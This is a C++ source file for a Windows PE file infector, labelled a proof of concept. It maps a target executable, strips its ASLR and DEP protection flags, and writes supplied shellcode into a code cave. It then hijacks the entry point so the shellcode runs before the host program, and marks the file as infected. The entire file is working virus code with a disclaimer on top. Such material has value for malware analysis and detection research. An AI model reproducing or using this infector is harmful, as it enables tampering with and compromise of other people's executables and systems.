/*

MIT License
Copyright (c) [2018] [Mutu Adi-Marian (aka xs8 | Xxshark888xX)]
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


	| ================================================================================================= |
	PE File Infection v1.0 - 05.06.2018
	
	!!! *THIS IS ONLY A POC (Proof of Concept), I DON'T TAKE ANY RESPONSIBILITY ABOUT HOW YOU WILL USE THIS PIECE OF CODE* !!!
	| ================================================================================================= |
	
	Fast explanation about how works:
	
		The virus will place the shellcode in the first code cave he will found,
		doesn't matter what section is, if he finds an empty code cave (null bytes)
		large as the shellcode + 2 bytes, the virus will insert the shellcode
		will change the OEP and sets also the INFECTED_FLAG
		[using the obsolete 'LoaderFlags' from the OPTIONAL_HEADER] (so if a PE is already infected he will stop the infection process)
		and closes the file mapping.
		
		The virus will abort the infection if a PE has a Digital Signature, is a .NET PE, if founds a TLS callback and if the PE is a DLL.
		If ASLR or DEP are enabled, the virus will try to disable one of them or both, if he fails, abort the infection.
		
		If he can't found the 'PLACEHOLDER' flag in the shellcode, the infection will be aborted!
		
		
	| ================================================================================================= |
	     Use the 'PEINFECTION_RESULT' enum to get a detailed info about the result of the infection
	| ================================================================================================= |
		
		
	My code will corrupt a packed PE if he infect it, because isn't able to find the real OEP of the PE.
	But, if he found a section named UPX0 or UPX1 (one of the most used packers) he will abort the infection.
	Anyway, this is NOT guaranteed to work, because the sections names can be changed.
	You can add in the '_pckrSignature' array others well know packer signatures.
	You can found a big list of well know signatures of PE Packers at this link -> https://raw.githubusercontent.com/guelfoweb/peframe/5beta/peframe/signatures/userdb.txt
		
		
	| ================================================================================================= |
	
	Written using VC++ (Visual Studio Community 2017).
	Tested on Windows 7/10 x64.
	Works with almost every 32bit PE. (I'm working to fix the 64bit version)
	
	N.B: If Visual Studio gives you an error about the missing "stdafx.h" file, right click the "PEInfect.cpp" file > Properties > C++ > Precompiled Headers
		 > Precompiled Header and choose 'Not Using Precompiled Headers'
*/


#include "PEInfect.h"


#define INFECTED_FLAG  0x65C5F4
#define PLACEHOLDER    0xAAAAAAAA
#define DOT_NET        0x000E
#define DIG_SIGNATURE  0x0004
#define ASLR           0x0040
#define DEP            0x0100
#define TLS            0x0009
#define IS_DLL         0x2000


enum PEINFECTION_RESULT {
	_UNKNOW                =  -1,
	_SUCCESS               =   1,
	_PE_INVALID_HANDLE     = -10,
	_PE_NULL_MAPPING       = -11,
	_PE_CANT_GET_NTH       = -12,
	_PE_CANT_GET_SECTIONS  = -13,
	_FAIL_CREATE_HEAP      = -14,
	_FAIL_ALLOC_HEAP       = -15,
	_FAIL_DISABLING_ASLR   = -20,
	_FAIL_DISABLING_DEP    = -21,
	_ALREADY_INFECTED      = -30,
	_HAS_DIGITAL_SIGNATURE = -31,
	_IS_DOT_NET            = -32,
	_IS_DLL                = -33,
	_TLS_CALLBACK          = -34,
	_CODECAVE_NOT_FOUND    = -40,
	_PLACEHOLDER_NOT_FOUND = -41,
	_FAIL_UPDATE_OEP       = -42,
	_PE_IS_PACKED          = -50,
	_PE_TARGET_IS_64BIT    =  64
};

// GLOBAL VARIABLES
HANDLE _g_hPEFile              = NULL;
HANDLE _g_hPEFileMapping       = NULL;
BYTE*  _g_peMap                = nullptr;
size_t _g_peMapSize;
HANDLE _g_hShellCodeHeap       = NULL;
LPVOID _g_shellCodeHeap        = nullptr;
BOOL   _g_peIs64bit            = FALSE;
PIMAGE_NT_HEADERS32 _g_peNth32 = nullptr;
PIMAGE_NT_HEADERS64 _g_peNth64 = nullptr;


BOOL GetNtHeader();
BOOL GetAllSections(std::vector<PIMAGE_SECTION_HEADER> &_vector, PEINFECTION_RESULT &_result);


#pragma region [GET_PE_MAP]
BOOL GetPEMap(std::wstring PETargetFilePath, BYTE* &_peMap, PEINFECTION_RESULT &_result) {
	_g_hPEFile = CreateFileW(PETargetFilePath.c_str(),
                           FILE_READ_ACCESS | FILE_WRITE_ACCESS,
                           FILE_SHARE_READ,
                           NULL,
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
	if (_g_hPEFile == INVALID_HANDLE_VALUE) {
		_result = _PE_INVALID_HANDLE;
		return 0;
	}

	_g_peMapSize = GetFileSize(_g_hPEFile, NULL);
	_g_hPEFileMapping = CreateFileMappingW(_g_hPEFile,
                                         NULL,
                                         PAGE_READWRITE,
                                         NULL,
                                         NULL,
                                         NULL);
	if (_g_hPEFileMapping == NULL) {
		_result = _PE_NULL_MAPPING;
		return 0;
	}

	_peMap = (BYTE*)MapViewOfFile(_g_hPEFileMapping,
                                FILE_MAP_READ | FILE_MAP_WRITE,
                                NULL,
                                NULL,
                                _g_peMapSize);

	if (GetNtHeader() == FALSE) {
		_result = _PE_CANT_GET_NTH;
		return 0;
	}

	return 1;
}
#pragma endregion

#pragma region [IS_VALID_POINTER]
BOOL IsValidPtr(VOID* _buff, size_t _fieldSize) {
	if (_g_peMap == nullptr || _buff == nullptr)
		return 0;

	ULONGLONG _peMapStart;
	ULONGLONG _peMapEnd;
	ULONGLONG _buffEnd;

	_peMapStart = (ULONGLONG)_g_peMap;
	_peMapEnd   = _peMapStart + _g_peMapSize;
	_buffEnd    = (ULONGLONG)_buff + _fieldSize;

	if ((ULONGLONG)_buff < _peMapStart)
		return 0;

	if (_buffEnd > _peMapEnd)
		return 0;

	return 1;
}
#pragma endregion

#pragma region [IS_BAD_POINTER]
BOOL _IsBadReadPtr(VOID* _buff) {
	MEMORY_BASIC_INFORMATION _mbi = { 0 };

	if (VirtualQuery(_buff, &_mbi, sizeof(_mbi))) {
		DWORD _mask_ = (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY);
		bool  _r     = !(_mbi.Protect & _mask_);

		if (_mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS))
			_r = true;

		return _r;
	}

	return true;
}
#pragma endregion

#pragma region [IS_64BIT]
BOOL _Is64Bit(PIMAGE_NT_HEADERS64 &_inh64) {
	if (_inh64->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		return 1;

	return 0;
}
#pragma endregion

#pragma region [GET_NT_Header]
BOOL GetNtHeader() {
	if (_g_peMap == NULL)
		return 0;

    PIMAGE_DOS_HEADER _idh = (PIMAGE_DOS_HEADER)_g_peMap;
    if (_g_peMapSize != 0) {
        if (IsValidPtr(_idh, sizeof(PIMAGE_DOS_HEADER)) == FALSE)
             return 0;
	} else { return 0; }

    if (_IsBadReadPtr(_idh))
        return 0;
    
    if (_idh->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;
    
    LONG _peOffset  = _idh->e_lfanew;
    if ( _peOffset  > (LONG)0x400)
		return 0;

  PIMAGE_NT_HEADERS64 _inh64       = (PIMAGE_NT_HEADERS64)(_g_peMap + _peOffset);
  PIMAGE_NT_HEADERS32 _inh32       = (PIMAGE_NT_HEADERS32)(_g_peMap + _peOffset);
                      _g_peIs64bit = _Is64Bit(_inh64);

	if (_g_peIs64bit) {
		if (IsValidPtr(_inh64, sizeof(PIMAGE_NT_HEADERS64)) == FALSE)
			return 0;

		if (_IsBadReadPtr(_inh64))
			return 0;

		if (_inh64->Signature != IMAGE_NT_SIGNATURE)
			return 0;

		_g_peNth64 = _inh64;
	} else {
		if (IsValidPtr(_inh32, sizeof(PIMAGE_NT_HEADERS32)) == FALSE)
			return 0;

		if (_IsBadReadPtr(_inh32))
			return 0;

		if (_inh32->Signature != IMAGE_NT_SIGNATURE)
			return 0;

		_g_peNth32 = _inh32;
	}

    return 1;
}
#pragma endregion

#pragma region [IS_PACKED]
BOOL IsPacked(PEINFECTION_RESULT &_result) {
	std::vector<PIMAGE_SECTION_HEADER> _ish;

	if (GetAllSections(_ish, _result) == FALSE) {
		return 0;
	}


	// A big problem with packed PE is that it's hard do detect
	// the real OEP, if a PE is hard-packed and we continue
	// with the infection, most probably we will corrupt the PE

	// This will work only if a PE was packed using UPX
	// and the default sections names hasn't been changed
	
	// A better way is to detect the entropy of the PE

	const char* _pckrSignature[] = {
		"UPX0", "UPX1"
	};
	
	for (WORD i = 0; i < _ish.size(); i++) {
		for (UINT8 j = 0; j < sizeof(_pckrSignature) / sizeof(_pckrSignature[0]); j++) {
			if (_stricmp((char*)_ish.data()[i]->Name, _pckrSignature[j]) == 0) {
				_result = _PE_IS_PACKED;
				return 1;
			}
		}
	}
	
	return 0;
}
#pragma endregion

#pragma region [ASLR_&_DEP]
BOOL IsASLREnabled() {
	if (_g_peIs64bit) {
		if ((_g_peNth64->OptionalHeader.DllCharacteristics & ASLR) != 0)
			return 1;
	} else {
		if ((_g_peNth32->OptionalHeader.DllCharacteristics & ASLR) != 0)
			return 1;
	}

	return 0;
}

BOOL IsDEPEnabled() {
	if (_g_peIs64bit) {
		if ((_g_peNth64->OptionalHeader.DllCharacteristics & DEP) != 0)
			return 1;
	} else {
		if ((_g_peNth32->OptionalHeader.DllCharacteristics & DEP) != 0)
			return 1;
	}

	return 0;
}

BOOL Disable_ASLR_DEP(PEINFECTION_RESULT &_result) {
	if (IsASLREnabled()) {
		if (_g_peIs64bit) {
			_g_peNth64->OptionalHeader.DllCharacteristics &= ~ASLR;
		} else {
			_g_peNth32->OptionalHeader.DllCharacteristics &= ~ASLR;
		}

		if (IsASLREnabled()) {
			_result = _FAIL_DISABLING_ASLR;
			return 0;
		}
	}

	if (IsDEPEnabled()) {
		if (_g_peIs64bit) {
			_g_peNth64->OptionalHeader.DllCharacteristics &= ~DEP;
		} else {
			_g_peNth32->OptionalHeader.DllCharacteristics &= ~DEP;
		}

		if (IsDEPEnabled()) {
			_result = _FAIL_DISABLING_DEP;
			return 0;
		}
	}

	return 1;
}
#pragma endregion

#pragma region [IS_INFECTABLE]
BOOL IsInfectable(PEINFECTION_RESULT &_result) {
	if (IsPacked(_result))
		return 0;
	
	if (_g_peIs64bit) {

		// I'm working on a solution to infect also 64bit PE.
		// Theoretically "already" works because he successfully infects the 64 bit PE with a working shellcode
		// but after the shellcode ends, the host crashes :(
		// So for now if a target PE is 64bit, the code will abort the infection

		_result = _PE_TARGET_IS_64BIT;
		return 0;

		if (_g_peNth64->OptionalHeader.LoaderFlags == INFECTED_FLAG) {
			_result = _ALREADY_INFECTED;
			return 0;
		}
		if (_g_peNth64->OptionalHeader.DataDirectory[DOT_NET].VirtualAddress != 0) {
			_result = _IS_DOT_NET;
			return 0;
		}
		if (_g_peNth64->OptionalHeader.DataDirectory[TLS].VirtualAddress != 0 &&
			_g_peNth64->OptionalHeader.DataDirectory[TLS].Size != 0) {
			_result = _TLS_CALLBACK;
			return 0;
		}
		if (_g_peNth64->OptionalHeader.DataDirectory[DIG_SIGNATURE].VirtualAddress != 0 &&
			_g_peNth64->OptionalHeader.DataDirectory[DIG_SIGNATURE].Size != 0) {
			_result = _HAS_DIGITAL_SIGNATURE;
			return 0;
		}
		if (_g_peNth64->FileHeader.Characteristics & IS_DLL) {
			_result = _IS_DLL;
			return 0;
		}
	} else {
		if (_g_peNth32->OptionalHeader.LoaderFlags == INFECTED_FLAG) {
			_result = _ALREADY_INFECTED;
			return 0;
		}
		if (_g_peNth32->OptionalHeader.DataDirectory[DOT_NET].VirtualAddress != 0) {
			_result = _IS_DOT_NET;
			return 0;
		}
		if (_g_peNth32->OptionalHeader.DataDirectory[TLS].VirtualAddress != 0 &&
			_g_peNth32->OptionalHeader.DataDirectory[TLS].Size != 0) {
			_result = _TLS_CALLBACK;
			return 0;
		}
		if (_g_peNth32->OptionalHeader.DataDirectory[DIG_SIGNATURE].VirtualAddress != 0 &&
			_g_peNth32->OptionalHeader.DataDirectory[DIG_SIGNATURE].Size != 0) {
			_result = _HAS_DIGITAL_SIGNATURE;
			return 0;
		}
		if (_g_peNth32->FileHeader.Characteristics & IS_DLL) {
			_result = _IS_DLL;
			return 0;
		}
	}

	if (Disable_ASLR_DEP(_result) == 0)
		return 0;
	
	return 1;
}
#pragma endregion

#pragma region [SHELLCODE_HEAP]
BOOL CreateHeap(DWORD _shellCodeSize, PEINFECTION_RESULT &_result) {
	_g_hShellCodeHeap = HeapCreate(NULL,
                                 NULL,
                                 _shellCodeSize);
	if (_g_hShellCodeHeap == NULL) {
		_result = _FAIL_CREATE_HEAP;
		return 0;
	}

	return 1;
}

BOOL AllocHeap(BYTE* _shellCodeData, DWORD _shellCodeSize, PEINFECTION_RESULT &_result) {
	_g_shellCodeHeap = HeapAlloc(_g_hShellCodeHeap,
                               HEAP_ZERO_MEMORY,
                               _shellCodeSize);
	if (_g_shellCodeHeap == NULL) {
		_result = _FAIL_ALLOC_HEAP;
		return 0;
	}

	memcpy(_g_shellCodeHeap, _shellCodeData, _shellCodeSize);

	return 1;
}
#pragma endregion

#pragma region [GET_ORIGINAL_ENTRY_POINT]
DWORD GetOEP() {
	if (_g_peIs64bit) {
		return _g_peNth64->OptionalHeader.AddressOfEntryPoint; //+ _g_peNth64->OptionalHeader.ImageBase;
	} else {
		return _g_peNth32->OptionalHeader.AddressOfEntryPoint + _g_peNth32->OptionalHeader.ImageBase;
	}
}
#pragma endregion

#pragma region [GET_INFECTED_SECTION_SIZE]
DWORD GetSectionSize(PIMAGE_SECTION_HEADER _imageSection) {
	return _imageSection->PointerToRawData + _imageSection->SizeOfRawData;
}
#pragma endregion

#pragma region [GET_SECTIONS]
PIMAGE_SECTION_HEADER GetSection(WORD _num) {
	PIMAGE_FILE_HEADER    _ifh    = nullptr;
	LPVOID                _secPtr = nullptr;
	PIMAGE_SECTION_HEADER _ish    = nullptr;

	if (_g_peIs64bit) {
		_ifh = &_g_peNth64->FileHeader;
	} else {
		_ifh = &_g_peNth32->FileHeader;
	}
	
	if (_num > _ifh->NumberOfSections)
		return nullptr;

	if (!_ifh)
		return nullptr;

	if (IsValidPtr(_ifh, (size_t)_ifh->SizeOfOptionalHeader) == FALSE)
		return nullptr;

	if (_g_peIs64bit) {
		_secPtr = (LPVOID)((BYTE*)&_g_peNth64->OptionalHeader + (size_t)_ifh->SizeOfOptionalHeader);
	} else {
		_secPtr = (LPVOID)((BYTE*)&_g_peNth32->OptionalHeader + (size_t)_ifh->SizeOfOptionalHeader);
	}
  
  _ish      = (PIMAGE_SECTION_HEADER)((ULONGLONG)_secPtr + (IMAGE_SIZEOF_SECTION_HEADER * _num));

	if (IsValidPtr(_ish, sizeof(IMAGE_SECTION_HEADER)) == FALSE)
		return nullptr;

	return _ish;
}

BOOL GetAllSections(std::vector<PIMAGE_SECTION_HEADER> &_vector, PEINFECTION_RESULT &_result) {
	std::vector<PIMAGE_SECTION_HEADER> _ish;
	WORD                               _maxSections;

	if (_g_peIs64bit) {
		_maxSections = _g_peNth64->FileHeader.NumberOfSections;
	} else {
		_maxSections = _g_peNth32->FileHeader.NumberOfSections;
	}
	
	try {
		for (WORD i = 0; i < _maxSections; i++) {
			_ish.push_back(GetSection(i));
		}
	} catch (const std::exception&) {
		_result = _PE_CANT_GET_SECTIONS;
		return 0;
	}

	if (_ish.size() == 0) {
		_result = _PE_CANT_GET_SECTIONS;
		return 0;
	}
	
	_vector = _ish;
	return 1;
}
#pragma endregion

#pragma region [FIND_CODECAVE]
BOOL FindCodeCave(DWORD &_shellCodeSize, PIMAGE_SECTION_HEADER &_iSectionHeader, DWORD &_codeCavePos, PEINFECTION_RESULT &_result) {
	DWORD                              _ccPos  = 0;
	DWORD                              _ccSize = 0;
	WORD                               _sectCnt;
	std::vector<PIMAGE_SECTION_HEADER> _ish;

	if (GetAllSections(_ish, _result) == FALSE)
		return 0;

	for (_sectCnt = 0; _sectCnt < _ish.size(); _sectCnt++) {
		for (_ccPos = _ish.data()[_sectCnt]->PointerToRawData; _ccPos < GetSectionSize(_ish.data()[_sectCnt]); _ccPos++) {
			if (*(_g_peMap + (_ccPos + 2)) == 0x00) {
				if (_ccSize++ == _shellCodeSize) {
					_ccPos -= _shellCodeSize;
					_ccPos += 4;
					break;
				}
			} else { _ccSize = 0; }
		}
		if (_ccSize - 1 == _shellCodeSize)
			break;
	}

	if (_ccSize < _shellCodeSize || _ccPos == 0) {
		_result = _CODECAVE_NOT_FOUND;
		return 0;
	}

	/*MessageBox(0, ("Sections Count: " + std::to_string(_ish.size()) + "\n" +
			   "Infected Section Name: " + (char*)_ish.data()[_sectCnt]->Name + "\n" +
			   "Infected Section Size:" + std::to_string(GetSectionSize(_ish.data()[_sectCnt])) + "\n" +
			   "Code Cave Size: " + std::to_string(_ccSize) + "\nShellCode Size: " + std::to_string(_shellCodeSize) + "\n" +
			   "ShellCode Offset: " + std::to_string(_ccPos) + "\n" +
			   "PE Map Size: " + std::to_string(_g_peMapSize) + "\n" +
			   "PE OEP: " + std::to_string(GetOEP())).c_str(),
			   "Info", 0);*/


	_iSectionHeader = _ish.data()[_sectCnt];
	_codeCavePos    = _ccPos;
	return 1;
}
#pragma endregion

#pragma region [INJECT_SHELLCODE]
BOOL InjectShellCode(PIMAGE_SECTION_HEADER &_iSectHeader, DWORD _shellCodeSize, DWORD _codeCaveOffset, PEINFECTION_RESULT &_result) {
	bool _placeHolderFound = false;
	bool _oepUpdated       = false;

	for (DWORD i = 0; i < _shellCodeSize; i++) {
		if (*((DWORD*)_g_shellCodeHeap + i) == PLACEHOLDER) {
			*((DWORD*)_g_shellCodeHeap + i) = GetOEP();
			_placeHolderFound = true;
			break;
		}
	}

	if (_placeHolderFound == false) {
		_result = _PLACEHOLDER_NOT_FOUND;
		return 0;
	}

	memcpy((LPBYTE)
		(_g_peMap + _codeCaveOffset),
		 _g_shellCodeHeap,
		 _shellCodeSize);

	if (_g_peIs64bit) {
		_g_peNth64->OptionalHeader.LoaderFlags = INFECTED_FLAG;
    _iSectHeader->Misc.VirtualSize        += _shellCodeSize;
    _iSectHeader->Characteristics         |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

		_g_peNth64->OptionalHeader.AddressOfEntryPoint = _codeCaveOffset
                                                   + _iSectHeader->VirtualAddress
                                                   - _iSectHeader->PointerToRawData;

		if (_g_peNth64->OptionalHeader.AddressOfEntryPoint == _codeCaveOffset
                                                        + _iSectHeader->VirtualAddress
                                                        - _iSectHeader->PointerToRawData) {
			_oepUpdated = true;
		}
	} else {
		_g_peNth32->OptionalHeader.LoaderFlags = INFECTED_FLAG;
		_iSectHeader->Misc.VirtualSize        += _shellCodeSize;
		_iSectHeader->Characteristics         |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

		_g_peNth32->OptionalHeader.AddressOfEntryPoint = _codeCaveOffset
                                                   + _iSectHeader->VirtualAddress
                                                   - _iSectHeader->PointerToRawData;

		if (_g_peNth32->OptionalHeader.AddressOfEntryPoint == _codeCaveOffset
                                                        + _iSectHeader->VirtualAddress
                                                        - _iSectHeader->PointerToRawData) {
			_oepUpdated = true;
		}
	}

	if (_oepUpdated == false) {
		_result = _FAIL_UPDATE_OEP;
		return 0;
	}

	_result = _SUCCESS;
	return 1;
}
#pragma endregion

PEINFECTION_RESULT __infect(std::wstring PETargetFilePath, std::vector<BYTE> ShellCode) {
	PEINFECTION_RESULT    _infectionResult  = _UNKNOW;
	DWORD                 _shellCodeSize    = ShellCode.size();
	PIMAGE_SECTION_HEADER _iSectHeader      = nullptr;
	DWORD                 _codeCaveOffset   = 0;


	if (GetPEMap(PETargetFilePath, _g_peMap, _infectionResult) == FALSE)
		goto cleanup;

	if (IsInfectable(_infectionResult) == FALSE)
		goto cleanup;

	if (FindCodeCave(_shellCodeSize, _iSectHeader, _codeCaveOffset, _infectionResult) == FALSE)
		goto cleanup;

	if (CreateHeap(_shellCodeSize, _infectionResult) == FALSE)
		goto cleanup;

	if (AllocHeap(ShellCode.data(), _shellCodeSize, _infectionResult) == FALSE)
		goto cleanup;


	InjectShellCode(_iSectHeader, _shellCodeSize, _codeCaveOffset, _infectionResult);


cleanup:

	HeapFree(_g_hShellCodeHeap, 0, _g_shellCodeHeap);
	HeapDestroy(_g_hShellCodeHeap);
	UnmapViewOfFile(_g_peMap);
	CloseHandle(_g_hPEFileMapping);
	CloseHandle(_g_hPEFile);

	return _infectionResult;
}

PEINFECTION_RESULT PEInfect(std::wstring PETargetFilePath, std::vector<BYTE> ShellCode) {
	try {
		return __infect(PETargetFilePath, ShellCode);
	} catch (const std::exception&) {
		return _UNKNOW;
	}
}
